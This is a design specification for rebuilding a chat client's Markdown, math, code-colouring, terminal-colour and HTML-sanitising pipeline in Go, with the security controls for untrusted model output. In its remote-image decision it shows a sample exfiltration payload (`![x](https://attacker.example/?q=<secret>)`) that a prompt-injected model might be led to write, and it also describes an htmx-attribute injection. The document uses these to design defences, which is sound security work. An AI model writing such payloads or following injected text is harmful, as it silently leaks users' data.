# Markdown, math, code highlighting, ANSI colour and HTML sanitising: Go specification

Covers `mdast-util-*`, `micromark-*`, `shiki`, `@shikijs/langs`, `katex`, `anser` and
`dompurify`.

> **Status: design, not built.** Upstream facts were read at the pinned commit recorded in
> [../README.md](../README.md). Statements that are reasoning and not read from source
> open with "Inference". Go module facts were checked on 2026-11-18 with
> `go list -m -json <module>@latest`, `go mod download -json <module>@<version>` (Go
> 1.27.4) and by reading the licence, `go.mod` and source in the module cache. No module
> code was compiled or run: what a module *does* is stated from its source, and how well
> it renders is **not** established here.

| | |
|---|---|
| **Library IDs** | `DH-LIB-MICROMARK`, `DH-LIB-MICROMARKMATH`, `DH-LIB-KATEX`, `DH-LIB-SHIKI`, `DH-LIB-ANSER`, `DH-LIB-DOMPURIFY` |
| **Upstream units** | 13 Markdown packages (table below), `UP-DEP-shiki`, `UP-DEP-@shikijs/langs`, `UP-DEP-katex`, `UP-DEP-anser`, `UP-DEP-dompurify`; debt `UP-DEBT-patch.mdast-util-gfm-autolink-literal@2.0.1`, `UP-DEBT-patch.micromark-extension-gfm-autolink-literal@2.1.0` |
| **Kind** | bundled into the client. Three of the Markdown packages are also used by documentation scripts at the repository root |
| **Used by** | `packages/client/ui-primitives` (all but one); `packages/client/ui-sidebar-documentpreview` (`dompurify`); root `scripts/` (documentation checks) |
| **Go choice** | Five verified Go modules and one piece of own code, all running **in the host process**; the browser receives finished HTML |
| **Related areas** | Transcript, tool-card and document-preview UI areas; [react.md](react.md) (`DH-ADR-REACT-2`, streaming); [design.md §6](../design.md#6-security-model) |

| Library ID | Job | Upstream packages | Go choice | Version, licence |
|---|---|---|---|---|
| `DH-LIB-MICROMARK` | Parse and render Markdown | `mdast-util-from-markdown` 2.1.0, `mdast-util-gfm` 3.1.0, `micromark-extension-gfm` 3.0.0, `micromark-core-commonmark` 2.0.3, `micromark-factory-space` 2.0.1, `micromark-util-character` 2.1.1, `micromark-util-classify-character` 2.0.1, `micromark-util-decode-string` 2.0.1, `micromark-util-sanitize-uri` 2.0.1, `micromark-util-symbol` 2.0.1, `micromark-util-types` 2.0.2 | `github.com/yuin/goldmark` | v1.8.7, MIT |
| `DH-LIB-MICROMARKMATH` | Recognise math in Markdown | `micromark-extension-math` 3.1.0, `mdast-util-math` 3.0.0 | `github.com/gohugoio/hugo-goldmark-extensions/passthrough` | v0.6.0, Apache-2.0 |
| `DH-LIB-KATEX` | Typeset math | `katex` 0.18.7 | `github.com/wyatt915/treeblood`, **provisional**, behind a harness interface and an output filter | v0.1.16, MIT |
| `DH-LIB-SHIKI` | Colour source code | `shiki` 4.4.3, `@shikijs/langs` 4.4.3 | `github.com/alecthomas/chroma/v2` (tokeniser only) | v2.27.0, MIT |
| `DH-LIB-ANSER` | Show terminal colour | `anser` 2.3.5 | own code | n/a |
| `DH-LIB-DOMPURIFY` | Remove dangerous HTML | `dompurify` 3.4.16 | `github.com/microcosm-cc/bluemonday` | v1.0.27, BSD-3-Clause |

## 1. What it is and why upstream needs it

A model writes its answers in **Markdown**, a plain-text notation for headings, lists,
tables, links and code. The client turns that text into a formatted page while the model
is still writing. Four further notations ride along: **GFM** (GitHub Flavored Markdown:
tables, task lists, strike-through, bare links, footnotes), **TeX math** between dollar
signs, **source code** in fenced blocks, which is coloured by language, and **ANSI escape
sequences**, the colour commands a terminal program prints, which appear in command
output shown on tool cards.

All of this text is **untrusted**. It comes from a model, from files the model read, from
web pages it fetched and from programs it ran. Text that is allowed to become page markup
can run script in the user's browser or make requests with the user's session. Rendering
it is therefore a security control, not only formatting.

One finding corrects an easy assumption. **Upstream does not sanitise model output with
DOMPurify.** Its Markdown renderer never lets source HTML into the page at all: "raw HTML
renders as literal text (no HTML enters the DOM)"
(`packages/client/ui-primitives/src/markdown/render.tsx:9-10`), and React builds page
elements through an interface that cannot be given markup. DOMPurify is used in exactly
one other place, the preview of an HTML *file*
(`packages/client/ui-sidebar-documentpreview/src/client/html/basic-document.ts:3`). The Go
design builds HTML as strings on the host, so it loses React's structural guarantee and
must replace it deliberately ([DH-ADR-DOMPURIFY-1](#dh-adr-dompurify-1)).

## 2. How upstream uses it

| Use site (`path:line`) | What it is used for | API used |
|---|---|---|
| `packages/client/ui-primitives/src/markdown/parse.ts:13-17`, `:31-36`, `:44-49` | **Two grammars.** While text streams: CommonMark plus GFM, no math, "so incomplete TeX never flashes KaTeX errors mid-stream". Once settled: the same plus math | `fromMarkdown`, `gfm`, `gfmFromMarkdown`, `math`, `mathFromMarkdown` |
| `parse.ts:23` | Strike-through needs `~~`; a single `~` stays literal, "as in ranges such as `10~20`" | `gfm({ singleTilde: false })` |
| `markdown/incremental.ts:4-14`, `:38` | **Incremental parsing**: freeze every top-level block except the last two; re-parse only the tail; inside an unclosed code fence only the last lines | positions of parsed blocks |
| `markdown/render.tsx:56-72`, `:595-599` | Links: `javascript:`, `vbscript:`, `data:` and `blob:` are refused; a relative or unparsable destination is refused | own code; `normalizeUri` |
| `markdown/render.tsx:74-80`, `:104-114` | Images: an absolute `http` or `https` address is shown as written, so the browser fetches it; local paths go through a resolver the owner supplies | own code |
| `markdown/render.tsx:376-378` | Raw HTML in the source is literal text, or omitted | own code |
| `markdown/cjkFriendlyStrong.ts:1-10` | Bold works next to Chinese, Japanese and Korean punctuation without spaces (`**注意：**内容`) | micromark `attention`, `classifyCharacter`, `unicodePunctuation` |
| `markdown/mathCompatibility.ts:340-346` | Math is also recognised between `\(`…`\)` and `\[`…`\]`, and as a one-line `$$`…`$$` block | micromark tokenizer types, `factorySpace` |
| `markdown/windows-path-destinations.ts:1-4`, `markdown/file-link.ts:1` | A link destination written as a Windows path keeps its backslashes; local paths open in the file preview after the message settles | `decodeString` |
| `markdown/plain-text.ts:1-6` | Markdown to plain text for summaries and labels, with the same grammar | `parseGfm` |
| `markdown/katex.tsx:20`, `:69-74` | Typeset one formula: strict first, lenient on failure, an error span last; default trust settings | `katex.renderToString` |
| `markdown/copy-tex.ts:1` | Copying a selection that contains formulas puts their TeX source on the clipboard | DOM |
| `markdown/highlight.ts:1-19`, `:21-26`, `:42`, `:127-133`; `.agents/notes/archived/architecture/2026-08-06-web-shell-dist-chunk-layout.md:21` | One synchronous highlighter with a regular-expression engine in JavaScript, three grammars at start (TypeScript, shell, JSON), the rest (23 when that note was written) loaded on first use, a theme made of CSS variables so that light and dark need no re-highlighting, plain text for an unknown language | `createHighlighterCoreSync`, `createCssVariablesTheme`, `createJavaScriptRegexEngine`, `@shikijs/langs/*` |
| `markdown/useViewportHighlighting.ts:7-25` | A code block is highlighted only when it scrolls into view | `IntersectionObserver` |
| `packages/client/ui-primitives/src/ansi.ts:4`; `TerminalBlock.tsx:3`; `README.md:257` | Command output: colours and text attributes, carriage return, backspace, erase-in-line, tab stops and character width are honoured; cursor positioning, screen clearing and the alternate screen are stripped | `Anser` (JSON chunks) |
| `ui-sidebar-documentpreview/src/client/html/basic-document.ts:10-22`; `HtmlBody.tsx:102` | **Static HTML preview**: sanitise the whole document, forbid a list of elements and every `href`, add a restrictive Content-Security-Policy as the first element of the head, show it in an `<iframe sandbox="">` | `DOMPurify.sanitize` with `WHOLE_DOCUMENT`, `FORBID_TAGS`, `FORBID_ATTR` |
| `HtmlBody.tsx:68`; `ui-sidebar-documentpreview/README.md:62` | **Interactive HTML preview** (a setting): no sanitising; scripts run in an `<iframe sandbox="allow-scripts">` without same-origin access | browser sandbox |
| `scripts/markdown.ts:3-5`, `scripts/project-doc-site.ts:15-17`, `scripts/translation-pairing.ts:10-12`, `scripts/verify-mermaid.ts:9-11` | Documentation checks parse the repository's own Markdown | `fromMarkdown`, `gfm` |

**Size.** Upstream states that the web shell was "a single ~1.2 MB (minified) index
chunk, roughly 80% of it vendor bytes — KaTeX, the boot grammars and the shiki engine,
react-dom, the markdown pipeline"
(`.agents/notes/archived/architecture/2026-08-06-web-shell-dist-chunk-layout.md:10`). No
per-library size is stated.

## 3. Tech debt upstream carries

| Debt ID | What it is | Evidence (`path:line`) | Resolution in Go |
|---|---|---|---|
| `UP-DEBT-patch.micromark-extension-gfm-autolink-literal@2.1.0` | A bare URL followed by Chinese punctuation swallowed the punctuation and the prose after it. The patch ends a bare URL at non-ASCII punctuation, symbols or whitespace, with extra code for characters outside the basic plane, in both the development and the production copy of the tokenizer | `patches/micromark-extension-gfm-autolink-literal@2.1.0.patch:13-46` (the two end-of-URL checks), `:48-103` (new helper functions), `:105-198` (the same again for the production copy); `packages/client/ui-primitives/README.md:249` | Resolved by `DH-LIB-MICROMARK-R5`: goldmark takes the URL pattern as an option (`extension/linkify.go:91`), so the rule is configuration, with a test, and no file is patched |
| `UP-DEBT-patch.mdast-util-gfm-autolink-literal@2.0.1` | The same rule a second time. This package finds bare URLs again with its own regular expression after parsing, so both had to be patched or they would disagree | `patches/mdast-util-gfm-autolink-literal@2.0.1.patch:9-11` | Resolved by the same requirement: goldmark has one place that recognises a bare URL |
| Not a unit here: grammars patched at load time | The Go grammar's struct-field rule "backtracks exponentially"; the Perl match rule mis-colours patterns. Both are rewritten in memory when the grammar loads | `markdown/highlight.ts:44-60`; `ui-primitives/README.md:250-251` | Chroma has its own lexers, and each rule has a 250 ms match limit (`regexp.go:375` in the module), so a pathological line degrades and cannot hang. `DH-LIB-SHIKI-R3`. The units belong to the `ui-primitives` area |
| Not a unit here: long lines stay uncoloured | A line of 1,000 or more UTF-16 units is one plain run, because scanning cost grows faster than length | `ui-primitives/README.md:248` | Kept as a stated limit, `DH-LIB-SHIKI-R3` |
| Not a unit here: math copies as TeX only inside one document | | `ui-primitives/README.md:246` | See `DH-LIB-KATEX-R4` |
| Not a unit here: a reference defined after its block froze stays literal while streaming | | `markdown/incremental.ts:25-28`; `ui-primitives/README.md:244` | Carried, same cause: `DH-LIB-MICROMARK-R8` |

Search performed: `patches/` (two patches, both above), `pnpm-workspace.yaml` (no pin for
these packages beyond the two patch entries at `:122-123`), and the "Known Limitations"
of `ui-primitives` and `ui-sidebar-documentpreview`.

## 4. Requirements for the Go implementation

**Markdown (`DH-LIB-MICROMARK`).**

| Req ID | Requirement | Comes from |
|---|---|---|
| `DH-LIB-MICROMARK-R1` | CommonMark with tables, task lists, footnotes, bare links and strike-through. Strike-through needs two tildes; one tilde is literal | `parse.ts:13-17`, `:23` |
| `DH-LIB-MICROMARK-R2` | HTML written in the source is shown as the characters the author typed. No part of the source ever becomes an element or an attribute | `render.tsx:9-10`, `:376-378` |
| `DH-LIB-MICROMARK-R3` | A link is active only if its destination parses as an absolute address with a scheme on an allow-list (`http`, `https`, `mailto`). Everything else is shown as text. A destination that is a local path becomes an "open in preview" control handled by the host, only in a settled message. Windows paths keep their backslashes | `render.tsx:56-72`; `windows-path-destinations.ts:1`; `ui-primitives/README.md:119-121`. **Change:** upstream refuses four schemes and lets every other one through; an allow-list fails closed |
| `DH-LIB-MICROMARK-R4` | The page never fetches an address chosen by the text without a user action. An image whose source is a remote address is shown as a placeholder with the address and a "load" control; images served by the host itself (attachments, files resolved from local paths) are shown | **Change** from `render.tsx:104-114`, which displays a remote image as written. See [DH-ADR-MICROMARK-2](#dh-adr-micromark-2) |
| `DH-LIB-MICROMARK-R5` | A bare URL ends before non-ASCII punctuation, symbols and whitespace and keeps non-ASCII letters, so `见 https://example.com/路径。后文` links exactly `https://example.com/路径` | Both patches; `ui-primitives/README.md:123`, `:249` |
| `DH-LIB-MICROMARK-R6` | Asterisk bold opens after CJK text before punctuation and closes after punctuation before CJK text | `cjkFriendlyStrong.ts:1-4`; `ui-primitives/README.md:123` |
| `DH-LIB-MICROMARK-R7` | Rendering is a pure function: the same text and options give the same bytes, with no dependence on time, map order or earlier calls | `DH-ADR-WIRE-3` ("rendering must be a pure function of the durable event") |
| `DH-LIB-MICROMARK-R8` | Streaming: for every prefix of a reply, the frozen blocks plus the tail equal a fresh render of that prefix with the streaming grammar. Each source region is parsed a bounded number of times. Inside an unclosed fence only new lines are produced | `incremental.ts:4-14`; `DH-ADR-REACT-2` in [react.md](react.md) |
| `DH-LIB-MICROMARK-R9` | A plain-text projection of Markdown, for titles and summaries, drops exactly the markup the renderer would draw | `plain-text.ts:1-6` |
| `DH-LIB-MICROMARK-R10` | Hostile input is bounded: deep nesting, very long lines and huge tables finish within a size-proportional time or are cut at a stated limit; nothing panics | Inference: the text is model- and tool-controlled; `DH-ADR-TOOLCHAIN-3` (fuzzing at trust boundaries) |

**Math (`DH-LIB-MICROMARKMATH`, `DH-LIB-KATEX`).**

| Req ID | Requirement | Comes from |
|---|---|---|
| `DH-LIB-MICROMARKMATH-R1` | In a settled message, text between `$`…`$`, `$$`…`$$`, `\(`…`\)` and `\[`…`\]` is math. While the message streams none of them is: the delimiters and the TeX are shown as text. Math is never recognised inside code | `parse.ts:1-9`, `:26-29`; `mathCompatibility.ts:340-346` |
| `DH-LIB-KATEX-R1` | A settled formula is typeset, inline or as a display block, without script in the page | `katex.tsx:69`; [DH-ADR-3](../design.md#dh-adr-3) |
| `DH-LIB-KATEX-R2` | TeX is untrusted. Whatever the formula contains, the output consists only of presentational MathML elements and a fixed list of attributes; no class, style, link, event attribute or HTML element can come from the formula | `render.tsx:10` ("KaTeX runs without trusted commands") |
| `DH-LIB-KATEX-R3` | A formula that cannot be typeset is shown as its TeX source in an error style. It never breaks the message around it and never shows a stack trace | `katex.tsx:69-74` (three-step chain) |
| `DH-LIB-KATEX-R4` | The TeX source of every formula stays in the page as an annotation, so that it can be copied | `copy-tex.ts:1`; `ui-primitives/README.md:123` |
| `DH-LIB-KATEX-R5` | Typesetting one formula is bounded in time and output size, including macro expansion | Inference from `DH-LIB-MICROMARK-R10` |

**Code (`DH-LIB-SHIKI`) and terminal output (`DH-LIB-ANSER`).**

| Req ID | Requirement | Comes from |
|---|---|---|
| `DH-LIB-SHIKI-R1` | A fenced block or a tool's code view is coloured by language name, alias or file path. An unknown or missing language is plain monospace text, never an error | `highlight.ts:10-18`, `:199-203` |
| `DH-LIB-SHIKI-R2` | Colour is carried by class names that the theme style sheet maps to design tokens, so switching between light and dark needs no new HTML and no inline style | `highlight.ts:3-6` |
| `DH-LIB-SHIKI-R3` | Cost is bounded: a per-rule time limit, long lines left uncoloured, and a maximum size above which a block is plain | `ui-primitives/README.md:248`, `:250` |
| `DH-LIB-SHIKI-R4` | While a fence is still open during streaming its lines are appended uncoloured; it is coloured once, when it closes | `incremental.ts:11-14`; `ui-primitives/README.md:245` |
| `DH-LIB-ANSER-R1` | Colours and text attributes of command output are shown. The 16 basic colours map to theme tokens so they stay readable in both themes; 256-colour and 24-bit colours are shown as given | `ansi.ts:34-50` |
| `DH-LIB-ANSER-R2` | Carriage return, backspace, erase-in-line, tab stops and character width are replayed, so a progress bar shows its last state. Every other control sequence is removed; none reaches the page as visible characters | `ui-primitives/README.md:257`; `ansi.ts:1-2` |
| `DH-LIB-ANSER-R3` | Output text is escaped, and the work per byte is constant | Inference: the bytes come from arbitrary programs |

**Sanitising (`DH-LIB-DOMPURIFY`).**

| Req ID | Requirement | Comes from |
|---|---|---|
| `DH-LIB-DOMPURIFY-R1` | Every HTML fragment built from untrusted text passes an allow-list filter **in the host process**, as the last step of the function that built it, before it is cached or written to any response. No untrusted text is turned into HTML in the browser | [DH-ADR-DOMPURIFY-1](#dh-adr-dompurify-1) |
| `DH-LIB-DOMPURIFY-R2` | Only one harness package can produce the "trusted HTML" type that templates insert without escaping; a check fails the build if any other package converts a string to it | Inference from the loss of React's guarantee (section 1) |
| `DH-LIB-DOMPURIFY-R3` | The browser enforces the same intent independently: a Content-Security-Policy response header that allows no inline script and no script from another origin, and htmx told to ignore its own attributes inside any region that holds rendered untrusted content | Inference; see [DH-ADR-DOMPURIFY-1](#dh-adr-dompurify-1) |
| `DH-LIB-DOMPURIFY-R4` | The static preview of an HTML file runs no script, loads nothing from the network, submits no form, embeds no frame and cannot navigate, whatever the file contains | `basic-document.ts:10-22`; `ui-sidebar-documentpreview/README.md:51` |

## 5. Go choice

**Decision.** Everything in this family runs in the host. Five modules and one piece of
own code, each behind a narrow harness function so that a module can be replaced without
touching callers.

**Why.** [DH-ADR-3](../design.md#dh-adr-3) puts rendering on the host. Doing the
security-relevant work there also means it is done once, in one language, with the Go
fuzzer and golden files, and not separately in every browser.

### 5.1 Markdown

| Option | Pros | Cons | Verified facts |
|---|---|---|---|
| **`github.com/yuin/goldmark`** (chosen) | CommonMark with a parser and renderer that are both extensible per node kind, which every requirement above needs. Raw HTML is not rendered unless a caller asks (`renderer/html/html.go:383-398`). The bare-URL pattern is an option (`extension/linkify.go:91`). No dependencies | Three behaviours need own extensions (below). Its default for raw HTML is to replace it with a comment, not to show it | v1.8.7, 2026-10-30, MIT, `go.mod` has no requirements, no cgo. Ships tables, task lists, strike-through, linkify, footnotes, CJK line breaks (`extension/`) |
| `github.com/gomarkdown/markdown` | Maintained; has a math extension flag | Not a CommonMark implementation; no tagged release (pseudo-version only) | v0.0.0-20261117205512-a4849fb17e2c, 2026-11-17. Licence not read; rejected before that step |
| `github.com/russross/blackfriday/v2` | Widely used in the past | Not CommonMark; last release 2020 | v2.1.0, 2020-10-27. Rejected: unmaintained |
| Markdown rendered in the browser (keep micromark as an island) | Byte-identical to upstream | Untrusted text would cross the wire unrendered and the security control would be JavaScript; contradicts [DH-ADR-3](../design.md#dh-adr-3) | Not a Go module |

**Own extensions goldmark needs** (each a small parser or renderer registered through its
public extension points; Inference: sizes are estimates):

| Gap, read from the module source | Requirement | Own code |
|---|---|---|
| Raw HTML is replaced by `<!-- raw HTML omitted -->` (`renderer/html/html.go:390`, `:398`) | `R2` wants the literal text | A renderer for the two raw-HTML node kinds that writes the source escaped |
| Dangerous-URL check is a deny-list that allows some `data:` images (`renderer/html/html.go:937-959`) | `R3`, `R4` | Own link and image renderers with the allow-list, the local-path control and the image placeholder |
| The default bare-URL pattern stops at any non-ASCII character and needs a dot followed by letters in the host (`extension/linkify.go:16`), so it would cut `…/路径` and skip `http://localhost:3000` | `R5` | One regular expression passed to `WithLinkifyURLRegexp`. Inference: the rule needs no look-ahead, so Go's `regexp` can express it |
| Strike-through accepts one or two tildes (`extension/strikethrough.go:50`), no option | `R1` | A strike-through parser that requires two |
| Emphasis follows plain CommonMark flanking rules with no CJK allowance (`parser/delimiter.go:130-142`) | `R6` | A delimiter rule for `*` that relaxes flanking next to CJK characters, as upstream's extension does |

`github.com/yuin/goldmark-highlighting/v2` (the usual bridge from goldmark to chroma) is
**not** used: it has no tagged v2 release and its last commit is 2023-07-29
(v2.0.0-20230729083705-37449abec8cc, MIT), and the code-card markup (language header,
copy and wrap controls) is own code anyway.

<a id="dh-adr-micromark-1"></a>
#### DH-ADR-MICROMARK-1 Two grammars, as upstream: no math while streaming, math once settled

- **Decision.** The host renders a message in flight with the streaming grammar and the
  settled message with the settled grammar. The settled render replaces the live element.
- **Why.** Half-written TeX would flash errors, and a `$` in ordinary text would pair up
  with a later one until the sentence is complete.
- **Verdict on upstream.** *Keep* (`parse.ts:1-9`).
- **Tradeoff or constraint.** A formula appears typeset only when the message ends, and
  "a `$$` block is a paragraph while streaming and a math block once settled" (`parse.ts:7-8`).
- **Serves.** [DH-O-12](../design.md#dh-o-12). **Verified by.** `DH-T-MICROMARK-5`,
  `DH-T-MICROMARKMATH-1`.

<a id="dh-adr-micromark-2"></a>
#### DH-ADR-MICROMARK-2 Remote images are not fetched until the user asks (decided by the owner, DH-ADR-22)

- **Decision.** The renderer never emits an image element whose source is outside the
  host. A remote image is a placeholder that shows the address and a control that loads
  it. The page's Content-Security-Policy restricts image sources to the host, so a
  renderer defect cannot undo this.
- **Why.** An image address is fetched by the browser as soon as it is on the page. Text
  that the model was tricked into writing can put data in that address
  (`![x](https://attacker.example/?q=<secret>)`) and the data leaves without any click.
  Upstream shows remote images as written (`render.tsx:104-114`). The design's security
  model already lists "Injected text can drive any allowed action" as a residual gap
  ([design.md §6](../design.md#6-security-model)); this closes one silent instance of it.
- **Verdict on upstream.** *Change.*
- **Tradeoff or constraint.** One extra click to see a remote image. The owner decided
  it ([DH-ADR-22](../design.md#dh-adr-22)).
- **Serves.** [DH-O-7](../design.md#dh-o-7). **Verified by.** `DH-T-MICROMARK-2`,
  `DH-T-DOMPURIFY-3`.

### 5.2 Math

Two separate jobs: finding the math in the text, and typesetting it.

**Finding it.** `github.com/gohugoio/hugo-goldmark-extensions/passthrough` v0.6.0
(2026-10-30, Apache-2.0, maintained by the Hugo project, no cgo; its `go.mod` requires
goldmark and a test library). It takes lists of inline and block delimiter pairs
(`passthrough.go:17-19`, `:513-518`) and yields nodes holding the raw text between them,
which is exactly `DH-LIB-MICROMARKMATH-R1` including the backslash delimiters. Rejected:
`github.com/litao91/goldmark-mathjax` (pseudo-version only, last commit 2021-02-17) and
`github.com/wyatt915/goldmark-treeblood` v0.0.1 (2025-10-05, MIT), which fuses parsing
with one typesetter and so cannot sit behind the interface below.

**Typesetting it.**

| Option | Script in the page | Pros | Cons | Verified facts |
|---|---|---|---|---|
| **A. Host converts TeX to MathML with `github.com/wyatt915/treeblood`, own output filter** (chosen, provisional) | None | Meets [DH-ADR-3](../design.md#dh-adr-3) literally; MathML is rendered natively by browsers; source kept as an annotation | Young module, one maintainer. **Its writer does not escape**: attribute values and text are written as stored (`mmlnode.go:160-166`, `:180`), a `\class` command copies formula text into an attribute (`command_defs.go:119`), only `<` is escaped in the annotation (`treeblood.go:76`), every formula carries an inline style (`treeblood.go:66`), and attributes are written in map order, which is not stable (`mmlnode.go:160`). It is unsafe to use without the filter of `DH-LIB-KATEX-R2`. Coverage and visual quality against KaTeX are unmeasured | v0.1.16, 2025-09-08, MIT, no cgo, one indirect requirement (`go.yaml.in/yaml/v3`). API: `DisplayStyle`, `InlineStyle` (`treeblood.go:85`, `:92`) |
| B. KaTeX as a JavaScript island | KaTeX, run after a message settles | Mature; identical to upstream's output; trusted commands are off by default | Script, a style sheet and font files to vendor; a formula is TeX text until the script runs; with scripts off it stays TeX text. Size is not stated separately upstream (section 2). Delivery: the published prebuilt script, style sheet and fonts, unmodified and hash-pinned ([DH-ADR-LEXICAL-2](lexical.md#dh-adr-lexical-2)); not fetched or verified in this task | Not a Go module |
| C. Run KaTeX inside the host in a JavaScript engine written in Go | None | KaTeX's output without a browser island | A JavaScript engine in the host for one feature; `github.com/dop251/goja` has no tagged release (v0.0.0-20261118204651-8dfece3d1e1d). `github.com/FurqanSoftware/goldmark-katex` (v0.0.0-20260813161535-d0f6370693c2) takes this route; its engine was not inspected for cgo | Rejected on weight |
| D. Show TeX source only | None | Nothing to go wrong | Removes a feature users have | This is also the failure mode of A (`DH-LIB-KATEX-R3`) |

<a id="dh-adr-katex-1"></a>
#### DH-ADR-KATEX-1 Math is typeset on the host behind one interface; `treeblood` is its first, provisional implementation

- **Decision.** The renderer calls one harness function, "typeset this TeX, inline or
  display", that returns filtered MathML or an error. Only one adapter file imports a
  typesetting module. The adapter (1) refuses input over a size limit, (2) calls the
  module with a recovered panic and a deadline, (3) passes the result through the
  MathML policy of `DH-LIB-DOMPURIFY`, which keeps presentational MathML elements and a
  fixed attribute list and drops everything else, including `class`, `style` and
  `annotation-xml`, and (4) on any error returns the TeX source for the error style.
- **Why.** No script is needed for the common case, and the interface confines both the
  module's risk and a later change of mind to one file. The filter is not optional
  hardening: the module's own writer is unsafe for untrusted input (table above).
- **Verdict on upstream.** *Keep* the behaviour (typeset when settled, three-step
  failure chain, source available for copy). *Replace* the mechanism.
- **Tradeoff or constraint.** MathML layout depends on the browser and on a math font
  being present; the result will not match KaTeX glyph for glyph. The choice becomes
  final only when `DH-T-KATEX-3` passes; if it fails, option B is the fallback, and that
  is a third island for the owner to accept.
- **Serves.** [DH-O-12](../design.md#dh-o-12), [DH-O-7](../design.md#dh-o-7);
  `DH-LIB-KATEX-R1` to `-R5`.
- **Verified by.** `DH-T-KATEX-1`, `-2`, `-3`.

### 5.3 Code highlighting

| Option | Pros | Cons | Verified facts |
|---|---|---|---|
| **`github.com/alecthomas/chroma/v2`, tokeniser only** (chosen) | Many languages with no asset loading; lexers load lazily from embedded files; every rule has a 250 ms match limit (`regexp.go:375`); a class-based HTML mode exists (`formatters/html/html.go:26`) | Its lexers are not the TextMate grammars shiki uses, so colours differ in detail from upstream; its regular-expression engine backtracks (hence the time limit); binary size cost is unmeasured | v2.27.0, 2026-06-17, MIT (file `COPYING`), no cgo. Requires `github.com/dlclark/regexp2/v2` v2.2.1 (MIT) and two test libraries. 279 lexer definition files under `lexers/embedded` |
| Shiki as a JavaScript island | Identical colours to upstream | Script plus one grammar file per language, loaded on demand; code is uncoloured until it runs; upstream needed two in-memory grammar patches | Not a Go module |
| No highlighting | Nothing to maintain | Removes a feature | n/a |

The harness uses chroma's tokeniser and writes the `<span class>` elements itself, with
escaped text. This keeps the output vocabulary in harness hands (`DH-LIB-DOMPURIFY-R1`)
and lets the code card decide line structure for wrapping and copying.

**Scope boundary of this choice.** A line longer than the stated limit (upstream uses
1,000 UTF-16 units, `ui-primitives/README.md:248`), and a block above
the size limit of `DH-LIB-SHIKI-R3`, is shown as one plain, uncoloured run. This is a
consequence of the chosen tokeniser (a backtracking engine with a per-rule time limit)
and of the rule that the core binary is pure Go ([DH-ADR-15](../design.md#dh-adr-15)),
which rules out an engine without backtracking in C; it is not a platform fact. It
answers `UP-DEBT-limit.packages.client.ui-primitives.8` and is checked by
`DH-T-SHIKI-1`.

### 5.4 Terminal colour

| Option | Pros | Cons | Verified facts |
|---|---|---|---|
| **Own code** (chosen) | Exactly `R1` to `R3`: a small state machine for escape sequences, a line buffer for the replay rules, theme classes for the 16 colours | Own code to test. Inference: a few hundred lines | No module |
| `github.com/buildkite/terminal-to-html/v3` | Built for this job at scale; handles the replay rules; class-based colours (`style.go:96-117`); escapes text (`element.go:32`) | Does more than is wanted on untrusted bytes: it turns escape sequences into links and inline images (`element.go:39`, `:75-81`), which `R2` requires to be stripped, and the only screen options found set sizes (`screen.go:78`, `:83`); its `go.mod` also requires a command-line library for its own tool | v3.17.3, 2026-10-22, MIT, no cgo |
| `github.com/robert-nix/ansihtml` | Small; class prefix option (`ansihtml.go:53`) | Colours only; last release 2022-06-01 | v1.0.1, MIT |
| Feed the output to the host terminal emulator of [xterm.md](xterm.md) and print its grid | One emulator for everything | A grid has a fixed width and bounded history; command output is an unbounded stream of lines | See that specification |

### 5.5 Sanitising

| Option | Pros | Cons | Verified facts |
|---|---|---|---|
| **`github.com/microcosm-cc/bluemonday`** (chosen) | An allow-list policy engine: elements, attributes per element, URL schemes (`policy.go:558`, `:266`, `:720`). It filters a token stream (`sanitize.go:224`) and escapes what it keeps | Last release 2024-07-04, more than two years before this check; one maintainer; `go.mod` retracts v1.0.0 to v1.0.25. It refuses `<style>` elements unless a policy sets `AllowUnsafe` (`policy.go:865`), which matters for the preview (section 7) | v1.0.27, BSD-3-Clause (`LICENSE.md`), no cgo. Requires `github.com/aymerick/douceur` v0.2.0 (MIT), `golang.org/x/net`, and indirectly `github.com/gorilla/css` v1.0.1 (BSD-style) |
| Own filter on `golang.org/x/net/html` | Maintained by the Go project; both policies are small | Own security code; URL handling is where such filters fail | v0.63.0, 2026-11-17, BSD-3-Clause. **Named fallback** if bluemonday stays unreleased or a defect is found |
| DOMPurify in the browser | Uses the browser's own parser, so parser and renderer cannot disagree | For the transcript it would mean unfiltered HTML crosses the wire and the control is script that may not have loaded | Not a Go module |

<a id="dh-adr-dompurify-1"></a>
#### DH-ADR-DOMPURIFY-1 Where untrusted text becomes HTML, and the four checks on it

- **Decision.** Untrusted text becomes HTML in exactly one host package. Four controls
  apply, each independent of the others:

  | # | Control | Where it runs | What it stops |
  |---|---|---|---|
  | 1 | **Escaping by default.** Templates escape every string. Only the render package can make the trusted-HTML type (`DH-LIB-DOMPURIFY-R2`) | Host, at render time | A template that forgets to escape |
  | 2 | **Safe by construction.** The Markdown, code, math and terminal renderers write text through an escaping writer and choose every element and attribute themselves; source HTML is text (`DH-LIB-MICROMARK-R2`) | Host, inside the render function | Markup from the source |
  | 3 | **The gate.** The finished fragment passes a bluemonday allow-list policy whose vocabulary is the renderers' own. It is the last statement of the render function, so no caller can obtain unfiltered output. Frozen blocks, the streaming tail and typeset formulas each pass it before they are stored or sent | Host, before cache and before any HTTP or event-stream write | A defect in control 2, in an own renderer or in a third-party module (the math module needs it today) |
  | 4 | **Browser enforcement.** A Content-Security-Policy header on every page; the transcript's content container tells htmx to ignore htmx attributes inside it | Browser | Script execution and htmx-driven requests if 1 to 3 all fail |

- **Why.** Upstream's guarantee was structural: React cannot be handed markup. A host
  that concatenates strings has no such guarantee, so one must be built and then checked
  by something that does not share its bugs. Control 4 exists because server-rendered
  pages have an attack upstream did not: an injected element carrying an htmx attribute
  can make an authenticated request on page load **without any script**, which a
  script-only policy does not stop.
- **Verdict on upstream.** *Keep* "raw HTML is literal text" and the URL rules. *Add*
  controls 3 and 4, which upstream did not need.
- **Tradeoff or constraint.** The gate parses every fragment a second time. On correct
  renderer output it must change nothing (`DH-T-DOMPURIFY-1` asserts this), so a gate
  that alters output in production is a renderer defect: it is counted and logged with
  the event's sequence number, never its content. Filtering in the host with one parser
  and displaying in a browser with another can disagree in principle; the allow-list has
  no element whose content is parsed as raw text and no script-capable attribute, which
  is what such disagreements need. Inference: that argument is not a proof, which is why
  control 4 exists and why `DH-T-DOMPURIFY-2` fuzzes the pipeline.
- **Serves.** [DH-O-7](../design.md#dh-o-7), [DH-O-12](../design.md#dh-o-12);
  `DH-LIB-DOMPURIFY-R1` to `-R3`.
- **Verified by.** `DH-T-DOMPURIFY-1`, `-2`, `-3`.

<a id="dh-adr-dompurify-2"></a>
